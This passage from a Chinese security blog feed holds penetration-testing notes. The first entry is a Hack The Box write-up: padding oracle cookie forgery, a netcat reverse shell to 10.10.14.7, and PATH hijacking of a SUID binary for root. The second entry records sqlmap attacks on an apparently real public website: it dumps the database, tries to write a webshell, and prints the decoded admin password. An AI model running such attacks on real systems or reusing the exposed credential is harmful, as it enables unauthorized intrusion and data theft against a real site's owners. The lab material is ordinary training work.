class="hljs-symbol">linux:</span>linux_kernel<br></code></pre></div></td></tr></table></figure><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-09/11.PNG" alt="11"></p><h4 id="nikto"><a href="#nikto" class="headerlink" title="nikto"></a>nikto</h4><p><strong>nikto -h 10.10.10.18</strong></p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">Apache</span>/<span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">7</span> (Ubuntu)<br><span class="hljs-attribute">PHP</span>/<span class="hljs-number">5</span>.<span class="hljs-number">5</span>.<span class="hljs-number">9</span>-<span class="hljs-number">1</span>ubuntu<span class="hljs-number">4</span>.<span class="hljs-number">21</span><br></code></pre></div></td></tr></table></figure><p>经过检查，web目录十分干净，只有少数的功能。</p><ul><li>注册用户功能，检查sql注入</li></ul><h4 id="wapita"><a href="#wapita" class="headerlink" title="wapita"></a>wapita</h4><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">wapiti -u http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.18</span>/login.php<br>wapiti -u http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.18</span>/register.php<br>wapiti -u  http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.18</span><span class="hljs-regexp">/classes/</span><br></code></pre></div></td></tr></table></figure><p>扫描，无漏洞</p><h4 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a>gobuster</h4><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">gobuster -u http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.18</span> -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>dirbuster/directory-list-<span class="hljs-number">2.3</span>-medium.txt<br><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.18</span><span class="hljs-regexp">/classes/</span><br></code></pre></div></td></tr></table></figure><p>发现目录遍历，该目录下有几个php文件。auth.php跳转到admin/login.php</p><p>用burp拦截，发现302跳转，404not found =》admin/login.php</p><p>这让我不禁想到，login.php是否可以登陆admin</p><p>admin/admin尝试登陆，提示Invalid credentials，爆破失败</p><h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><ul><li>检查openssh是否有低版本漏洞</li></ul><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> root@<span class="hljs-number">10.10.10.18</span><br><br><span class="hljs-attribute">The</span> authenticity of host &#x27;<span class="hljs-number">10.10.10.18</span> (<span class="hljs-number">10.10.10.18</span>)&#x27; can&#x27;t be established.<br><span class="hljs-attribute">ECDSA</span> key fingerprint is SHA<span class="hljs-number">256</span>:OJ<span class="hljs-number">5</span>DTyZUGZXEpX<span class="hljs-number">4</span>BKFNTApa<span class="hljs-number">88</span>gR/+w<span class="hljs-number">5</span>vcNathKIPcWE.<br><span class="hljs-attribute">Are</span> you sure you want to continue connecting (yes/no)? yes<br><span class="hljs-attribute">Warning</span>: Permanently added &#x27;<span class="hljs-number">10.10.10.18</span>&#x27; (ECDSA) to the list of known hosts.<br><span class="hljs-attribute">root</span>@<span class="hljs-number">10.10.10.18</span>: Permission denied (publickey).<br><br><span class="hljs-attribute">python</span> ssh.py --userList /usr/share/wordlists/linux-user.txt <span class="hljs-number">10.10.10.18</span> --outputFile /root/Desktop/users.txt<br></code></pre></div></td></tr></table></figure><p>检查结果：公钥私钥登陆方式，好像不允许私钥登陆</p><ul><li>检查中间件漏洞<br>Apache + PHP &lt; 5.3.12 / &lt; 5.4.2 - cgi-bin Remote Code Execution + Scanner                                           | exploits/php/remote/29316.py</li></ul><p>cgi-bin目录不存在，所以漏洞不存在</p><h2 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h2><p>参考资料： <a href="https://www.secpulse.com/archives/3537.html">Padding Oracle Attack 笔记</a></p><p>Padding Oracle Attack，简要的说就是密码学配置不当，会导致任意文件读取。</p><p>工具：wget <a href="https://raw.githubusercontent.com/GDSSecurity/PadBuster/master/padBuster.pl">https://raw.githubusercontent.com/GDSSecurity/PadBuster/master/padBuster.pl</a></p><p>使用burp抓包，获取Cookie。</p><h4 id="数据包"><a href="#数据包" class="headerlink" title="数据包"></a>数据包</h4><figure class="highlight http"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><br><span class="apache"><span class="hljs-attribute">Host</span>: <span class="hljs-number">10.10.10.18</span></span><br><span class="apache"></span><br><span class="apache"><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (X<span class="hljs-number">11</span>; Linux x<span class="hljs-number">86</span>_<span class="hljs-number">64</span>; rv:<span class="hljs-number">60</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">60</span>.<span class="hljs-number">0</span></span><br><span class="apache"></span><br><span class="apache"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span></span><br><span class="apache"></span><br><span class="apache"><span class="hljs-attribute">Accept</span>-Language: en-US,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span></span><br><span class="apache"></span><br><span class="apache"><span class="hljs-attribute">Cookie</span>: PHPSESSID=l<span class="hljs-number">8</span>g<span class="hljs-number">93</span>fl<span class="hljs-number">443</span>iinu<span class="hljs-number">6</span>cndl<span class="hljs-number">71</span>g<span class="hljs-number">1</span>ic<span class="hljs-number">5</span>; auth=zZs<span class="hljs-number">1</span>CucXwORHrUD<span class="hljs-number">2</span>uEkfi<span class="hljs-number">7</span>HKtO<span class="hljs-number">4</span>MqN<span class="hljs-number">0</span>e</span><br><span class="apache"></span><br><span class="apache"><span class="hljs-attribute">Connection</span>: close</span><br><span class="apache"></span><br><span class="apache"><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span></span><br><span class="apache"></span><br><span class="apache"><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span></span><br></code></pre></div></td></tr></table></figure><h4 id="padBuster-pl"><a href="#padBuster-pl" class="headerlink" title="padBuster.pl"></a>padBuster.pl</h4><p>Use: padBuster.pl URL EncryptedSample BlockSize [options]</p><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">Padding Oracle <span class="hljs-comment">-- 填充oracle解密：</span><br>perl padBuster.pl http://<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.18</span> zZs1CucXwORHrUD2uEkfi7HKtO4MqN0e -cookies auth=zZs1CucXwORHrUD2uEkfi7HKtO4MqN0e <span class="hljs-number">8</span> -<span class="hljs-keyword">encoding</span> <span class="hljs-number">0</span><br><br>填充oracle加密<br>perl padBuster.pl http://<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.18</span> zZs1CucXwORHrUD2uEkfi7HKtO4MqN0e -cookies auth=zZs1CucXwORHrUD2uEkfi7HKtO4MqN0e <span class="hljs-number">8</span> -<span class="hljs-keyword">encoding</span> <span class="hljs-number">0</span> -plaintext <span class="hljs-keyword">user</span>=<span class="hljs-keyword">admin</span><br><br>当获得<span class="hljs-keyword">admin</span>加密后，获得了cookies字符串。用burp修改包。<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-09/3.PNG" alt="3"></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-09/4.PNG" alt="4"></p><p>访问/mysshkeywithnamemitsos</p><p>将密钥保存为一个名为id_rsa的文件。</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">chmod</span> <span class="hljs-number">400</span> id_rsa<br><span class="hljs-attribute">ssh</span> -i id_rsa mitsos@<span class="hljs-number">10.10.10.18</span><br></code></pre></div></td></tr></table></figure><h4 id="INFO"><a href="#INFO" class="headerlink" title="INFO"></a>INFO</h4><p>家目录下有一个suid权限的elf程序。尝试用john破解/etc/shadow，失败。</p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-string">mitsos@LazyClown:~$</span> <span class="hljs-string">ls</span> <span class="hljs-string">-al</span> <span class="hljs-string">backup</span><br><span class="hljs-string">-rwsrwsr-x</span> <span class="hljs-number">1</span> <span class="hljs-string">root</span> <span class="hljs-string">root</span> <span class="hljs-number">7303 </span><span class="hljs-string">May</span>  <span class="hljs-number">3</span>  <span class="hljs-number">2017 </span><span class="hljs-string">backup</span><br><br><span class="hljs-string">mitsos@LazyClown:~$</span> <span class="hljs-string">file</span> <span class="hljs-string">backup</span><br><span class="hljs-attr">backup:</span> <span class="hljs-string">setuid,</span> <span class="hljs-string">setgid</span> <span class="hljs-string">ELF</span> <span class="hljs-number">32</span><span class="hljs-string">-bit</span> <span class="hljs-string">LSB</span>  <span class="hljs-string">executable,</span> <span class="hljs-string">Intel</span> <span class="hljs-number">80386</span><span class="hljs-string">,</span> <span class="hljs-string">version</span> <span class="hljs-number">1</span> <span class="hljs-string">(SYSV),</span> <span class="hljs-string">dynamically</span> <span class="hljs-string">linked</span> <span class="hljs-string">(uses</span> <span class="hljs-string">shared</span> <span class="hljs-string">libs),</span> <span class="hljs-string">for</span> <span class="hljs-string">GNU/Linux</span> <span class="hljs-number">2.6</span><span class="hljs-number">.24</span><span class="hljs-string">,</span> <span class="hljs-string">BuildID[sha1]=33d6b5bec96c44e630f37ff41cc1c4a8b2813b6b,</span> <span class="hljs-string">not</span> <span class="hljs-string">stripped</span><br><br><span class="hljs-string">一下就是/etc/shadow的第一行</span><br><span class="hljs-string">root:$6$v1daFgo/$.7m9WXOoE4CKFdWvC.8A9aaQ334avEU8KHTmhjjGXMl0CTvZqRfNM5NO2/.7n2WtC58IUOMvLjHL0j4OsDPuL0:17288:0:99999:7:::</span><br><br><span class="hljs-string">复制第一个冒号和第二个冒号之间的字符串，就是密文。将密文保存为文件名pass</span><br><span class="hljs-string">$6$v1daFgo/$.7m9WXOoE4CKFdWvC.8A9aaQ334avEU8KHTmhjjGXMl0CTvZqRfNM5NO2/.7n2WtC58IUOMvLjHL0j4OsDPuL0</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-string">john</span> <span class="hljs-string">--wordlist=/usr/share/john/password.lst</span> <span class="hljs-string">./pass</span><br><span class="hljs-string">解密失败</span><br><span class="hljs-meta">---</span><br></code></pre></div></td></tr></table></figure><p>strings backup</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-09/5.PNG" alt="5"></p><h4 id="上传nc"><a href="#上传nc" class="headerlink" title="上传nc"></a>上传nc</h4><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-string">mitsos@LazyClown:~$whereis</span> <span class="hljs-string">nc</span><br><span class="hljs-string">/bin/nc</span><br><br><span class="hljs-string">尝试nc反弹shell，结果netcat-openbsd</span> <span class="hljs-string">package，不支持-e参数。</span><br><span class="hljs-string">mitsos@LazyClown:~$/bin/nc</span> <span class="hljs-string">-e</span> <span class="hljs-string">/bin/sh</span> <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.7</span> <span class="hljs-number">1122</span><br><br><br><span class="hljs-string">于是上传一个nc</span><br><span class="hljs-string">wget</span> <span class="hljs-string">http://10.10.14.7/netcat;chmod</span> <span class="hljs-string">a+x</span> <span class="hljs-string">netcat</span><br><br><span class="hljs-string">/home/mitsos/netcat</span> <span class="hljs-string">-h</span> <br><span class="hljs-string">/home/mitsos/netcat</span> <span class="hljs-string">-e</span> <span class="hljs-string">/bin/sh</span> <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.7</span> <span class="hljs-number">1122</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-string">第一次上传的64位nc,提示出错</span><br><span class="hljs-string">-bash:</span> <span class="hljs-string">/home/mitsos/nc:</span> <span class="hljs-attr">cannot execute binary file:</span> <span class="hljs-string">Exec</span> <span class="hljs-string">format</span> <span class="hljs-string">error</span><br><span class="hljs-string">于是再次上传32位nc</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">uname</span> <span class="hljs-string">-a</span><br><span class="hljs-string">Linux</span> <span class="hljs-string">LazyClown</span> <span class="hljs-number">4.4</span><span class="hljs-number">.0</span><span class="hljs-number">-31</span><span class="hljs-string">-generic</span> <span class="hljs-comment">#50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux</span><br><br><span class="hljs-string">i686说明是32位的系统版本</span><br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-09/6.PNG" alt="6"><br>成功反弹shell</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>新建cat文件，内容是shell脚本。当suid程序执行cat /etc/shadow，加入环境变量后，会先执行以下脚本。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br>more /root/root.txt &gt; /home/mitsos/root.txt<br></code></pre></div></td></tr></table></figure><p>添加环境变量<code>export PATH=.:$PATH</code>；<code>chmod +x cat</code>，给/home/mitsos/cat添加执行权限。</p><p>运行/backup，发现root.txt已经复制到该目录。但是查看一下，发现还是root权限可读。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>more chmod a+r /home/mitsos/root.txt<br></code></pre></div></td></tr></table></figure><p>修改cat，然后再次运行backup即可获得root.txt的内容<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-09/7.PNG" alt="7"></p><h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><p>cat 内容为</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>/home/mitsos/netcat -e /bin/bash 10.10.14.7 1233<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-09/8.PNG" alt="8"></p><p>即可获得一个root shell</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>学习到了一种新的suid提权方式，虽然有suid权限的elf程序不<code>nmap|vim|find|bash|more|less|nano|cp</code>这些程序其中的任何一种，但是通过添加环境变量，可以顺带执行shell脚本。</p><p>这个突破防线的方式，通过伪造cookies，是由于密码算法使用不当，导致攻击者可以猜测出admin的cookies，从而登陆web。</p><p>Padding Oracle Attack，利用条件很苛刻。</p><p>也许是我对密码学的东西知之甚少。不知道在实际攻击过程中，这种方式是否常见。</p>]]></content>
    
    
    <categories>
      
      <category>training</category>
      
    </categories>
    
    
    <tags>
      
      <tag>training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>03-08-sql-inject</title>
    <link href="/2019/03/08/x/"/>
    <url>/2019/03/08/x/</url>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-08/2.PNG" alt="2"></p><h2 id="scan"><a href="#scan" class="headerlink" title="scan"></a>scan</h2><figure class="highlight livecodeserver"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver"><span class="hljs-number">80</span>/tcp   <span class="hljs-built_in">open</span>  <span class="hljs-keyword">http</span>          cloudflare<br><span class="hljs-number">443</span>/tcp  <span class="hljs-built_in">open</span>  ssl/<span class="hljs-keyword">https</span>     cloudflare<br><span class="hljs-number">8080</span>/tcp <span class="hljs-built_in">open</span>  <span class="hljs-keyword">http</span>-proxy    cloudflare<br><span class="hljs-number">8443</span>/tcp <span class="hljs-built_in">open</span>  ssl/<span class="hljs-keyword">https</span>-alt cloudflare<br></code></pre></div></td></tr></table></figure><p>确认为一个web server，有云防护，不允许直接ip访问</p><p>ping，返回值为ttl=128；网站url，大小写不敏感。</p><p>说明是windows os</p><h2 id="sql-inject"><a href="#sql-inject" class="headerlink" title="sql inject"></a>sql inject</h2><p><a href="http://www.radiomiriam.com.br/">www.radiomiriam.com.br</a>   104.28.2.130</p><p><a href="http://www.radiomiriam.com.br/noticia.php?id=615%27">http://www.radiomiriam.com.br/noticia.php?id=615%27</a></p><p>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘’615’’’ at line 1</p><ol><li><p>加单引号直接报错，两个单引号没有报错，确认了sql注入。</p></li><li><p>sqlmap -u “<a href="http://www.radiomiriam.com.br/noticia.php?id=615&quot;">http://www.radiomiriam.com.br/noticia.php?id=615&quot;</a> –dbs<br>提示无注入漏洞，em…<br>以为是数据库的原因，sqlmap是不是不支持MariaDB</p></li><li><p>网上搜索，sqlmap是支持MariaDB的。<br>用burp抓包，访问<code>http://www.radiomiriam.com.br/noticia.php?id=615</code>的数据包。</p></li></ol><p><code>sqlmap -r request.txt --threads 10 --level 5 --risk 3 --random-agent --batch -v 3</code><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-08/1.PNG" alt="1"></p><p>4.</p><figure class="highlight dsconfig"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dsconfig"><span class="hljs-string">sqlmap</span> -<span class="hljs-string">r</span> <span class="hljs-string">request</span>.<span class="hljs-string">txt</span> <span class="hljs-built_in">--threads</span> <span class="hljs-string">10</span> <span class="hljs-built_in">--level</span> <span class="hljs-string">5</span> <span class="hljs-built_in">--risk</span> <span class="hljs-string">3</span> <span class="hljs-built_in">--random-agent</span> <span class="hljs-built_in">--batch</span> -<span class="hljs-string">v</span> <span class="hljs-string">3</span> <span class="hljs-built_in">--dbms</span> <span class="hljs-string">mysql</span> <span class="hljs-built_in">--dbs</span><br><br>[*] <span class="hljs-string">information_schema</span><br>[*] <span class="hljs-string">radiomir_radio</span><br><br><span class="hljs-string">sqlmap</span> -<span class="hljs-string">r</span> <span class="hljs-string">request</span>.<span class="hljs-string">txt</span> <span class="hljs-built_in">--threads</span> <span class="hljs-string">10</span> <span class="hljs-built_in">--level</span> <span class="hljs-string">5</span> <span class="hljs-built_in">--risk</span> <span class="hljs-string">3</span> <span class="hljs-built_in">--random-agent</span> <span class="hljs-built_in">--batch</span> -<span class="hljs-string">v</span> <span class="hljs-string">3</span> <span class="hljs-built_in">--dbms</span> <span class="hljs-string">mysql</span> <span class="hljs-built_in">--current-db</span><br><span class="hljs-string">current</span> <span class="hljs-string">database</span>:    <span class="hljs-string">&#x27;radiomir_radio&#x27;</span><br><br><span class="hljs-string">sqlmap</span> -<span class="hljs-string">r</span> <span class="hljs-string">request</span>.<span class="hljs-string">txt</span> <span class="hljs-built_in">--threads</span> <span class="hljs-string">10</span> <span class="hljs-built_in">--level</span> <span class="hljs-string">5</span> <span class="hljs-built_in">--risk</span> <span class="hljs-string">3</span> <span class="hljs-built_in">--random-agent</span> <span class="hljs-built_in">--batch</span> -<span class="hljs-string">v</span> <span class="hljs-string">3</span> <span class="hljs-built_in">--dbms</span> <span class="hljs-string">mysql</span> -<span class="hljs-string">D</span> <span class="hljs-string">information_schema</span> <span class="hljs-built_in">--tables</span><br>[<span class="hljs-string">75</span> <span class="hljs-string">tables</span>]<br><br><span class="hljs-string">sqlmap</span> -<span class="hljs-string">r</span> <span class="hljs-string">request</span>.<span class="hljs-string">txt</span> <span class="hljs-built_in">--threads</span> <span class="hljs-string">10</span> <span class="hljs-built_in">--level</span> <span class="hljs-string">5</span> <span class="hljs-built_in">--risk</span> <span class="hljs-string">3</span> <span class="hljs-built_in">--random-agent</span> <span class="hljs-built_in">--batch</span> -<span class="hljs-string">v</span> <span class="hljs-string">3</span> <span class="hljs-built_in">--dbms</span> <span class="hljs-string">mysql</span> -<span class="hljs-string">D</span> <span class="hljs-string">radiomir_radio</span> <span class="hljs-built_in">--tables</span><br>[<span class="hljs-string">17</span> <span class="hljs-string">tables</span>]<br><br><span class="hljs-string">sqlmap</span> -<span class="hljs-string">r</span> <span class="hljs-string">id</span>.<span class="hljs-string">req</span> <span class="hljs-built_in">--threads</span> <span class="hljs-string">10</span> <span class="hljs-built_in">--level</span> <span class="hljs-string">5</span> <span class="hljs-built_in">--risk</span> <span class="hljs-string">3</span> <span class="hljs-built_in">--random-agent</span> <span class="hljs-built_in">--batch</span> <span class="hljs-built_in">--is-dba</span> -<span class="hljs-string">v</span> <span class="hljs-string">3</span><br>不是最高权限用户<br></code></pre></div></td></tr></table></figure><p>5.</p><figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli">sqlmap -r request.txt <span class="hljs-params">--threads</span> 10 <span class="hljs-params">--level</span> 5 <span class="hljs-params">--risk</span> 3 <span class="hljs-params">--random-agent</span> <span class="hljs-params">--batch</span> -v 3 <span class="hljs-params">--dbms</span> mysql -D radiomir_radio -T admin <span class="hljs-params">--column</span><br>Table: admin<br><br>[5 columns]<br>。。。<br><br><span class="hljs-params">---</span><br>将所有数据导出<br>sqlmap -r id.req <span class="hljs-params">--threads</span> 10 <span class="hljs-params">--level</span> 5 <span class="hljs-params">--risk</span> 3 <span class="hljs-params">--random-agent</span> <span class="hljs-params">--batch</span> <span class="hljs-params">--dump</span> -v 3<br><br><span class="hljs-string">/root/.sqlmap/output/www.radiomiriam.com.br/dump/radiomir_radio/noticias_imagens.csv</span><br><span class="hljs-string">/root/.sqlmap/output/www.radiomiriam.com.br</span><br></code></pre></div></td></tr></table></figure><p>6.<br>尝试写webshell，无写权限。</p><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">sqlmap -r request.txt <span class="hljs-comment">--threads 10 --level 5 --risk 3 --random-agent --batch -v 3 --dbms mysql --os-shell</span><br>[<span class="hljs-built_in">WARNING</span>] it looks <span class="hljs-keyword">like</span> the file has <span class="hljs-keyword">not</span> been written (usually occurs <span class="hljs-keyword">if</span> the DBMS process <span class="hljs-keyword">user</span> has <span class="hljs-keyword">no</span> <span class="hljs-keyword">write</span> <span class="hljs-keyword">privileges</span> <span class="hljs-keyword">in</span> the destination <span class="hljs-type">path</span>)<br></code></pre></div></td></tr></table></figure><p>7.<br>sqlmap -r request.txt –threads 10 –level 5 –risk 3 –random-agent –batch -v 3 –dbms mysql -D radiomir_radio -T admin -C senha –dump<br>aWZvNjQ3Nw==<br>解码后ifo6477</p><ol start="8"><li>找后台</li></ol><p>邮箱：<a href="mailto:&#x77;&#x65;&#98;&#109;&#x61;&#115;&#116;&#101;&#114;&#64;&#114;&#97;&#x64;&#x69;&#x6f;&#x6d;&#x69;&#x72;&#105;&#x61;&#109;&#46;&#99;&#x6f;&#x6d;&#46;&#98;&#114;">&#x77;&#x65;&#98;&#109;&#x61;&#115;&#116;&#101;&#114;&#64;&#114;&#97;&#x64;&#x69;&#x6f;&#x6d;&#x69;&#x72;&#105;&#x61;&#109;&#46;&#99;&#x6f;&#x6d;&#46;&#98;&#114;</a></p><p>访问这个网站<a href="http://www.radiomiriam.com.br,直接重定向到http//miriamcaravaggio.com.br/">www.radiomiriam.com.br，直接重定向到http://miriamcaravaggio.com.br/</a></p><p>后台地址：<a href="http://www.radiomiriam.com.br/cpanel">www.radiomiriam.com.br/cpanel</a><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-08/3.PNG" alt="3"></p><p>后台是通过代理连接的，没有凭据，所以无法连接。以后有经验了再看看cpanel吧…</p>]]></content>
    
    
    <categories>
      
      <category>record</category>
      
    </categories>
    
    
    <tags>
      
      <tag>record</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Bastard（drupal插件导致远程代码执行）</title>
    <link href="/2019/03/05/x/"/>
    <url>/2019/03/05/x/</url>
    
    <content type="html"><![CDATA[<p>10.10.10.9</p><h2 id="scan"><a href="#scan" class="headerlink" title="scan"></a>scan</h2><figure class="highlight livecodeserver"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver"><span class="hljs-number">80</span>/tcp    <span class="hljs-built_in">open</span>  <span class="hljs-keyword">http</span>    Microsoft IIS httpd <span class="hljs-number">7.5</span><br><span class="hljs-number">135</span>/tcp   <span class="hljs-built_in">open</span>  msrpc   Microsoft Windows RPC<br><span class="hljs-number">49154</span>/tcp <span class="hljs-built_in">open</span>  msrpc   Microsoft Windows RPC<br></code></pre></div></td></tr></table></figure><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>cms: drupal 7</p><p>Drupal 以权限划分用户可见页面，当使用超级管理员帐号登录，进入 admin 页面，这即可算做管理后台，约定所有模块的管理选项均在 admin 路径之下。</p><h4 id="whatweb"><a href="#whatweb" class="headerlink" title="whatweb"></a>whatweb</h4><p><code>whatweb  http://10.10.10.9/</code></p><figure class="highlight inform7"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs inform7">http://10.10.10.9/ <span class="hljs-comment">[200 